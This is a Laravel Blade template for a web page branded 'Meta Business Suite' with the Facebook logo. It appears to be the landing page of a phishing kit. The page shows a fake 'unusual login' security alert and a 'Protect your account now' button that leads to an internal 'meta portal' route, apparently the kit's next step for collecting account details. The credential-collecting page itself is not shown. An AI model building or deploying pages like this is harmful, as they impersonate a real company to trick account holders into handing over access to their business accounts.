@extends('master')
@section('style')
    <style>
        body{
            color: #3a3a3a;
            background: #041326;
            line-height: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 80px 0 30px 0;
        }
        
        .box-html-custom{
            color: white;
            opacity: .5;
            width: 38px;
            height: 38px;
            font-size: 9px;
        }
        .enter-form:hover{
            transition: ease .2s;
            transform: scale(1.05);
        }
        
        #banner {
            background-image: url("{{asset('image/banner.png')}}");
            background-size: contain;
            background-position: center;
            
            background-color: #000308;
            /* -webkit-filter: blur(20px);
            -moz-filter: blur(20px);
            -o-filter: blur(20px);
            -ms-filter: blur(20px); */
            /* filter: blur(20px); */
            width: 100%;
            height: 450px;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 9998;
        }
        .container-custom{
            height: 100%;
        }

        #logo{
            z-index: 9999;
            position: absolute;
            top: 450px;
            left: 50%;
            transform: translate(-50%, -50%);
            box-shadow: 0 0 10px 0 rgba(2, 107, 133, 0.5);
        }

        #content{
            margin-top: 200px;
        }

        @media (max-width: 1386px) {
            #banner {
                height: 350px;
                background-size: cover;
                background-repeat: no-repeat;
            }
            #logo{
                top: 350px;
            }
        }

        @media (max-width: 1200px) {
            #banner {
                height: 350px;
                background-size: cover;
                background-repeat: no-repeat;
            }
            #logo{
                top: 350px;
            }
        }

        @media (max-width: 768px) {
            #banner {
                height: 300px;
                background-size: cover;
                background-repeat: no-repeat;
            }
            #logo{
                width: 100px;
                height: 100px;
                top: 300px;
                font-weight: 
            }
            #content{
                margin-top: 50px;
            }
        }
    </style>
@endsection
@section('content')
    <div id="banner"></div>
    <img id="logo" class="rounded-circle" src="{{asset('image/avatar_200x200.jpg')}}" alt="" width="142" height="142">
    <div id="content" class="container container-custom d-flex flex-column justify-content-between align-items-center">
        <div class="d-flex flex-column justify-content-center align-items-center w-100" style="gap:15px">
            <h5 style="font-weight: 700; color: #ebebeb !important">Meta Business Suite</h5>
            <p style="max-width:550px; line-height:1.5; color: #ebeaea !important" class="text-center">
                We noticed an unusual login from a device or location you don't normally use. Are you already logged in? New login
            </p>
            <a href="{{route('index.meta.portal.info')}}" class="w-100"><div class="rounded-pill enter-form w-100" style="background-color: #013cc6; padding: 16px 3px; cursor: pointer;">
                {{-- <img class="rounded-circle" src="{{asset('image/meta-x.jpg')}}" alt="" width="40" height="40" style="position: absolute; transform: translateY(-30%);"> --}}
                <svg style="position: absolute; transform: translateY(-30%);" width="40" height="40" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="none"><path fill="#1877F2" d="M15 8a7 7 0 00-7-7 7 7 0 00-1.094 13.915v-4.892H5.13V8h1.777V6.458c0-1.754 1.045-2.724 2.644-2.724.766 0 1.567.137 1.567.137v1.723h-.883c-.87 0-1.14.54-1.14 1.093V8h1.941l-.31 2.023H9.094v4.892A7.001 7.001 0 0015 8z"/><path fill="#ffffff" d="M10.725 10.023L11.035 8H9.094V6.687c0-.553.27-1.093 1.14-1.093h.883V3.87s-.801-.137-1.567-.137c-1.6 0-2.644.97-2.644 2.724V8H5.13v2.023h1.777v4.892a7.037 7.037 0 002.188 0v-4.892h1.63z"/></svg>
                <p style="margin: 0; color: #ebebeb !important" class="text-center font-weight-bold">Protect your account now</p>
            </div></a>
        </div>
    </div>
@endsection
